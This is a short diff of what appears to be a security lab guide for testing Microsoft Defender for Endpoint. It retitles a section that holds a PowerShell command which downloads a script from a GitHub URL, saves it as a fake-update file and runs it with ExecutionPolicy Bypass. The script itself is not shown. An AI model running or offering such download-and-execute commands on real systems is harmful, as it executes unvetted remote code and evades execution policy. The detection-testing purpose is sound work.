@@ -13,10 +13,7 @@
 
 ---
 
-### 🌐 **PowerShell Payload (POC)**  
-
- 
-📥 **The PowerShell Payload**
+### 🌐 **The PowerShell Payload**  
 Run the PowerShell command below on your VM **after onboarding it to MDE**:
 ```powershell
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/VanessaMancia/PowerShell-test-script/refs/heads/main/testscript.ps1' -OutFile 'C:\ProgramData\phishingFakeSoftwareUpdate.ps1'; cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\phishingFakeSoftwareUpdate.ps1
